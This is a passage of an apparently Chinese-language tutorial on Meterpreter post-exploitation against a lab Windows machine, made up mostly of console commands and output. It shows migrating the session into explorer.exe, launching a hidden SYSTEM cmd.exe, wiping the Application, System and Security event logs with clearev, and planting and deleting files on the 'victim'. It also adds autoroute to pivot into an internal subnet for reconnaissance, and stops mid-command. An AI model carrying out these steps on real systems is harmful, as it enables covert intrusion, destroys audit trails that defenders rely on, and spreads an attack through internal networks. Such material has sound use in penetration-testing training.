<pre><code>2308  2268  explorer.exe       x64   1        WIN-5DTIE0M734E\root          C:\Windows\Explorer.EXE</code></pre><p>将Meterpreter会话移植到指定pid值进程中</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> migrate 2308
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Migrating from 1112 to 2308<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Migration completed successfully.
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里会发现，再次查看目标机进程信息会发现原有进程<code>pid=1112</code>还存在，但是已经不起作用了，属于无效进程，但是使用<code>kill 1119</code>是杀不死该进程的，因为该进程的权限是<code>system</code>的，就算目标机用户发现<code>pid=1112</code>有异常将其关闭，也不会影响迁移注入后的会话进程。</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ps</span>

Process List
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

 PID   PPID  Name               Arch  Session  User                  Path
 ---   ----  ----               ----  -------  ----                  ----
 0     0     <span class="token punctuation">[</span>System Process<span class="token punctuation">]</span>                                        
 4     0     System                                                  
 100   484   svchost.exe                                             
 244   4     smss.exe                                                
 332   320   csrss.exe                                               
 384   320   wininit.exe                                             
 392   376   csrss.exe                                               
 428   376   winlogon.exe                                            
 484   384   services.exe                                            
 500   384   lsass.exe                                               
 508   384   lsm.exe                                                 
 604   484   svchost.exe                                             
 664   484   svchost.exe                                             
 680   484   svchost.exe                                             
 756   484   svchost.exe                                             
 764   484   svchost.exe                                             
 832   484   svchost.exe                                             
 876   484   svchost.exe                                             
 1112  484   spoolsv.exe                                             
 1140  484   svchost.exe                                             
 1268  604   WmiPrvSE.exe                                            
 1288  484   VGAuthService.exe                                       
 1364  484   vmtoolsd.exe                                            
 1592  484   svchost.exe                                             
 1812  484   dllhost.exe                                             
 1900  484   msdtc.exe                                               
 2164  484   svchost.exe                                             
 2204  484   taskhost.exe       x64   1        WIN-5DTIE0M734E\root  C:\Windows\system32\taskhost.exe
 2276  832   dwm.exe            x64   1        WIN-5DTIE0M734E\root  C:\Windows\system32\Dwm.exe
 2308  2268  explorer.exe       x64   1        WIN-5DTIE0M734E\root  C:\Windows\Explorer.EXE
 2436  2308  vm3dservice.exe    x64   1        WIN-5DTIE0M734E\root  C:\Windows\System32\vm3dservice.exe
 2444  2308  vmtoolsd.exe       x64   1        WIN-5DTIE0M734E\root  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2640  484   SearchIndexer.exe                                       

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看迁移后的会话进程ID和权限：explorer进程为root普通用户权限，相当于降权（注意：原有explorer进程不受影响）</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getpid 
Current pid: 2308
meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> getuid 
Server username: WIN-5DTIE0M734E\root
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一旦降了权就无法迁移到system权限上了：升权被限制</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> migrate 2164
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Migrating from 2308 to 2164<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Error running <span class="token function">command</span> migrate: Rex::RuntimeError Cannot migrate into this process <span class="token punctuation">(</span>insufficient privileges<span class="token punctuation">)</span>
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="执行文件操作"><a href="#执行文件操作" class="headerlink" title="执行文件操作"></a>执行文件操作</h3><ul>
<li>指令指南</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">execute <span class="token comment" spellcheck="true">#在目标机中执行文件</span>
execute -H -i -f cmd.exe <span class="token comment" spellcheck="true"># 创建新进程cmd.exe，-H不可见，-i交互</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>实战：执行目标机中的文件</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> execute -h
Usage: execute -f <span class="token function">file</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>
Executes a <span class="token function">command</span> on the remote machine.

OPTIONS:

    -H        Create the process hidden from view.
    -a <span class="token operator">&lt;</span>opt<span class="token operator">></span>  The arguments to pass to the command.
    -c        Channelized I/O <span class="token punctuation">(</span>required <span class="token keyword">for</span> interaction<span class="token punctuation">)</span>.
    -d <span class="token operator">&lt;</span>opt<span class="token operator">></span>  The <span class="token string">'dummy'</span> executable to launch when using -m.
    -f <span class="token operator">&lt;</span>opt<span class="token operator">></span>  The executable <span class="token function">command</span> to run.
    -h        Help menu.
    -i        Interact with the process after creating it.
    -k        Execute process on the meterpreters current desktop
    -m        Execute from memory.
    -s <span class="token operator">&lt;</span>opt<span class="token operator">></span>  Execute process <span class="token keyword">in</span> a given session as the session user
    -t        Execute process with currently impersonated thread token
meterpreter <span class="token operator">></span> execute -H -i -f cmd.exe
Process 3004 created.
Channel 1 created.
Microsoft Windows <span class="token punctuation">[</span>�汾 6.1.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32<span class="token operator">></span>whoami
<span class="token function">whoami</span>
nt authority\system

C:\Windows\system32<span class="token operator">></span>exit
<span class="token keyword">exit</span>
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h3><ul>
<li>指令指南</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">clearav  <span class="token comment" spellcheck="true">#清除windows中的应用程序日志、系统日志、安全日志</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>实战：清除日志痕迹记录</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> clearev 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping 1069 records from Application<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping 5242 records from System<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Wiping 1168 records from Security<span class="token punctuation">..</span>.
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
<li>基本文件系统命令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">    Command       Description
    -------       -----------
    <span class="token function">cat</span>           读取会话系统中某一个文件的内容并显示
    <span class="token function">cd</span>            改变当前目录
    checksum      检索文件的校验和
    <span class="token function">cp</span>            文件复制操作
    <span class="token function">dir</span>           列出当前目录下的文件 <span class="token punctuation">(</span>ls的别名<span class="token punctuation">)</span>
    download      从当前目录下载某一个文件
    edit          编辑文件
    getlwd        打印本地当前工作目录
    getwd         打印工作目录
    lcd           改变本地工作目录
    lls           列出本地目录下的文件
    lpwd          打印本地当前工作目录
    <span class="token function">ls</span>            列出目录下所有文件
    <span class="token function">mkdir</span>         创建文件夹
    <span class="token function">mv</span>            移动文件
    <span class="token function">pwd</span>           打印当前工作目录
    <span class="token function">rm</span>            删除某个特殊文件
    <span class="token function">rmdir</span>         删除某个目录
    search        搜索文件
    show_mount    List all <span class="token function">mount</span> points/logical drives
    upload        上传文件或一个目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>文件操作</li>
</ul>
<p>查看当前维持的会话工作目录</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getwd
C:\Windows\system32
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>查看本地攻击机工作目录</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getlwd
/home/qftm
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>切换会话目录</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">cd</span> c:\\
meterpreter <span class="token operator">></span> <span class="token function">pwd</span>
c:\
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看特定目录下文件信息</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ls</span>
Listing: c:\
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

Mode             Size     Type  Last modified              Name
----             ----     ----  -------------              ----
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-13 23:18:56 -0400  <span class="token variable">$Recycle</span>.Bin
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-14 01:08:56 -0400  Documents and Settings
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  PerfLogs
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Program Files
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
40777/rwxrwxrwx  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  ProgramData
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-02-13 10:51:36 -0500  Recovery
40777/rwxrwxrwx  4096     <span class="token function">dir</span>   2020-02-13 10:48:53 -0500  System Volume Information
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Users
40777/rwxrwxrwx  16384    <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Windows
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-06-18 11:57:25 -0400  hack
0000/---------   1237680  fif   1971-09-30 08:50:40 -0400  pagefile.sys
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-04-25 20:38:11 -0400  software

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>向受害者主机创建相应文件夹并向主机上传文件：hacking.txt</p>
<p>本地生成</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># vim hacking.txt</span>
 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># ls</span>
hacking.txt  ProgrammingProjects  QSec
 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># cat hacking.txt </span>
Hacking by qftm<span class="token punctuation">..</span><span class="token punctuation">..</span>.
 → Qftm :~/Desktop<span class="token comment" spellcheck="true">#</span>

 meterpreter <span class="token operator">></span> lls
Listing Local: /home/qftm/Desktop
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   4096  <span class="token function">dir</span>   2020-05-03 22:04:11 -0400  ProgrammingProjects
40777/rwxrwxrwx   4096  <span class="token function">dir</span>   2020-06-16 11:23:45 -0400  QSec
100644/rw-r--r--  21    fil   2020-06-24 23:56:29 -0400  hacking.txt

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>像受害机上传文件并查看</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">mkdir</span> hack
Creating directory: hack
meterpreter <span class="token operator">></span> <span class="token function">ls</span>
Listing: c:\
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

Mode             Size     Type  Last modified              Name
----             ----     ----  -------------              ----
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-13 23:18:56 -0400  <span class="token variable">$Recycle</span>.Bin
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-14 01:08:56 -0400  Documents and Settings
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  PerfLogs
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Program Files
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
40777/rwxrwxrwx  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  ProgramData
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-02-13 10:51:36 -0500  Recovery
40777/rwxrwxrwx  4096     <span class="token function">dir</span>   2020-02-13 10:48:53 -0500  System Volume Information
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Users
40777/rwxrwxrwx  16384    <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Windows
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-06-25 00:01:24 -0400  hack
0000/---------   1237680  fif   1971-09-30 08:50:40 -0400  pagefile.sys
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-04-25 20:38:11 -0400  software

meterpreter <span class="token operator">></span> upload hacking.txt c:\hack
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploading  <span class="token keyword">:</span> hacking.txt -<span class="token operator">></span> c:hack
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploaded   <span class="token keyword">:</span> hacking.txt -<span class="token operator">></span> c:hack\hacking.txt
meterpreter <span class="token operator">></span> <span class="token function">ls</span> hack 
Listing: hack
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  21    fil   2020-06-25 00:01:47 -0400  hacking.txt

meterpreter <span class="token operator">></span> <span class="token function">cat</span> c:\\hack\\hacking.txt
Hacking by qftm<span class="token punctuation">..</span><span class="token punctuation">..</span>.
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改<code>hacking.txt</code></p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">cd</span> c:\\hack
meterpreter <span class="token operator">></span> <span class="token function">ls</span>
Listing: c:\hack
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  21    fil   2020-06-25 00:01:47 -0400  hacking.txt

meterpreter <span class="token operator">></span> edit hacking.txt 
meterpreter <span class="token operator">></span> <span class="token function">cat</span> hacking.txt 
Hacking by qftm<span class="token punctuation">..</span><span class="token punctuation">..</span>.

edit by attack1
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>删除<code>hacking.txt</code>文件</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">rm</span> hacking.txt 
meterpreter <span class="token operator">></span> <span class="token function">ls</span>
No entries exist <span class="token keyword">in</span> c:\hack
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>删除<code>c:\\hack</code>目录</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ls</span>
Listing: c:\
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

Mode             Size     Type  Last modified              Name
----             ----     ----  -------------              ----
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-13 23:18:56 -0400  <span class="token variable">$Recycle</span>.Bin
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-14 01:08:56 -0400  Documents and Settings
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  PerfLogs
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Program Files
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
40777/rwxrwxrwx  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  ProgramData
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-02-13 10:51:36 -0500  Recovery
40777/rwxrwxrwx  4096     <span class="token function">dir</span>   2020-02-13 10:48:53 -0500  System Volume Information
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Users
40777/rwxrwxrwx  16384    <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Windows
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-06-25 00:01:24 -0400  hack
0000/---------   1237872  fif   1971-09-30 09:18:56 -0400  pagefile.sys
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-04-25 20:38:11 -0400  software

meterpreter <span class="token operator">></span> <span class="token function">rmdir</span> hack 
Removing directory: hack
meterpreter <span class="token operator">></span> <span class="token function">ls</span>
Listing: c:\
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

Mode             Size     Type  Last modified              Name
----             ----     ----  -------------              ----
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-13 23:18:56 -0400  <span class="token variable">$Recycle</span>.Bin
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-14 01:08:56 -0400  Documents and Settings
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  PerfLogs
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Program Files
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
40777/rwxrwxrwx  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  ProgramData
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-02-13 10:51:36 -0500  Recovery
40777/rwxrwxrwx  4096     <span class="token function">dir</span>   2020-02-13 10:48:53 -0500  System Volume Information
40555/r-xr-xr-x  4096     <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Users
40777/rwxrwxrwx  16384    <span class="token function">dir</span>   2009-07-13 23:20:08 -0400  Windows
0000/---------   1237856  fif   1971-09-30 09:18:56 -0400  pagefile.sys
40777/rwxrwxrwx  0        <span class="token function">dir</span>   2020-04-25 20:38:11 -0400  software

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>搜索特定文件</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> search -h
Usage: search <span class="token punctuation">[</span>-d dir<span class="token punctuation">]</span> <span class="token punctuation">[</span>-r recurse<span class="token punctuation">]</span> -f pattern <span class="token punctuation">[</span>-f pattern<span class="token punctuation">]</span><span class="token punctuation">..</span>.
Search <span class="token keyword">for</span> files.

OPTIONS:

    -d <span class="token operator">&lt;</span>opt<span class="token operator">></span>  The directory/drive to begin searching from. Leave empty to search all drives. <span class="token punctuation">(</span>Default: <span class="token punctuation">)</span>
    -f <span class="token operator">&lt;</span>opt<span class="token operator">></span>  A <span class="token function">file</span> pattern glob to search for. <span class="token punctuation">(</span>e.g. *secret*.doc?<span class="token punctuation">)</span>
    -h        Help Banner
    -r <span class="token operator">&lt;</span>opt<span class="token operator">></span>  Recursivly search sub directories. <span class="token punctuation">(</span>Default: true<span class="token punctuation">)</span>

meterpreter <span class="token operator">></span> search -d c:\\ -f *cmd.exe
Found 12 results<span class="token punctuation">..</span>.
    c:\Program Files\VMware\VMware Tools\VMwareNamespaceCmd.exe <span class="token punctuation">(</span>36784 bytes<span class="token punctuation">)</span>
    c:\Program Files\VMware\VMware Tools\VMwareToolboxCmd.exe <span class="token punctuation">(</span>85424 bytes<span class="token punctuation">)</span>
    c:\Windows\System32\cmd.exe <span class="token punctuation">(</span>345088 bytes<span class="token punctuation">)</span>
    c:\Windows\System32\VaultCmd.exe <span class="token punctuation">(</span>27136 bytes<span class="token punctuation">)</span>
    c:\Windows\SysWOW64\cmd.exe <span class="token punctuation">(</span>302592 bytes<span class="token punctuation">)</span>
    c:\Windows\winsxs\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_6.1.7601.17514_none_e932cc2c30fc13b0\cmd.exe <span class="token punctuation">(</span>345088 bytes<span class="token punctuation">)</span>
    c:\Windows\winsxs\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7601.17514_none_6f0f7833cb71e18d\appcmd.exe <span class="token punctuation">(</span>193536 bytes<span class="token punctuation">)</span>
    c:\Windows\winsxs\amd64_microsoft-windows-security-vault_31bf3856ad364e35_6.1.7600.16385_none_4d5e025e54ba15f8\VaultCmd.exe <span class="token punctuation">(</span>27136 bytes<span class="token punctuation">)</span>
    c:\Windows\winsxs\amd64_microsoft-windows-snmp-evntcmd_31bf3856ad364e35_6.1.7600.16385_none_14f9b9481db6293b\evntcmd.exe <span class="token punctuation">(</span>25600 bytes<span class="token punctuation">)</span>
    c:\Windows\winsxs\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_6.1.7601.17514_none_f387767e655cd5ab\cmd.exe <span class="token punctuation">(</span>302592 bytes<span class="token punctuation">)</span>
    c:\Windows\winsxs\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.1.7601.17514_none_79642285ffd2a388\appcmd.exe <span class="token punctuation">(</span>155648 bytes<span class="token punctuation">)</span>
    c:\Windows\winsxs\x86_microsoft-windows-snmp-evntcmd_31bf3856ad364e35_6.1.7600.16385_none_b8db1dc46558b805\evntcmd.exe <span class="token punctuation">(</span>20480 bytes<span class="token punctuation">)</span>
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="基本网络操作指令"><a href="#基本网络操作指令" class="headerlink" title="基本网络操作指令"></a>基本网络操作指令</h3><ul>
<li>指令指南</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">    Command       Description
    -------       -----------
    arp           显示ARP缓存
    getproxy      查看当前代理配置
    <span class="token function">ifconfig</span>      查看网络接口信息
    ipconfig      查看网络接口信息
    <span class="token function">netstat</span>       查看网络连接情况（netstat -ano）
    route         查看和修改路由表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="路由转发-内网收集"><a href="#路由转发-内网收集" class="headerlink" title="路由转发+内网收集"></a>路由转发+内网收集</h3><p>实战：添加内网路由，对内网进行信息收集</p>
<ul>
<li>autoroute添加路由</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">run autoroute -h <span class="token comment" spellcheck="true">#查看帮助</span>
run get_local_subnets            <span class="token comment" spellcheck="true">#查看目标内网网段地址</span>
run autoroute -s 192.168.9.0/24  <span class="token comment" spellcheck="true">#添加到目标环境网络</span>
run autoroute -p  <span class="token comment" spellcheck="true">#查看添加的路由</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看内网www主机IP信息</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ifconfig</span> 

Interface  1
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Name         <span class="token keyword">:</span> MS TCP Loopback interface
Hardware MAC <span class="token keyword">:</span> 00:00:00:00:00:00
MTU          <span class="token keyword">:</span> 1520
IPv4 Address <span class="token keyword">:</span> 127.0.0.1


Interface 65539
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Name         <span class="token keyword">:</span> Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO/1000 MT Network Connection
Hardware MAC <span class="token keyword">:</span> 00:0c:29:23:57:f3
MTU          <span class="token keyword">:</span> 1500
IPv4 Address <span class="token keyword">:</span> 192.168.9.50
IPv4 Netmask <span class="token keyword">:</span> 255.255.255.0

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>添加内网路由并查看：（注意：该配置是在www服务器的meterpreter会话中配置的，而不是内网普通用户主机）</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> run autoroute -s 192.168.9.0/24

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Adding a route to 192.168.9.0/255.255.255.0<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Added route to 192.168.9.0/255.255.255.0 via 192.33.6.200
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Use the -p option to list all active routes
meterpreter <span class="token operator">></span> run autoroute -p

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Active Routing Table
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.9.0        255.255.255.0      Session 3

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>内网信息收集</li>
</ul>
<p>内网信息收集：利用<code>arp_scanner</code>、<code>portscan</code>等脚本模块进行信息收集</p>
<p>对内网主机进行一个收集</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> info post/windows/gather/arp_scanner

